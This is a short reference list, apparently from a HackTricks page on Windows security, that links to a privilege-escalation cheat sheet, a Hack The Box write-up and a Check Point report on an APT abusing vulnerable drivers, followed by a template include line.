- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
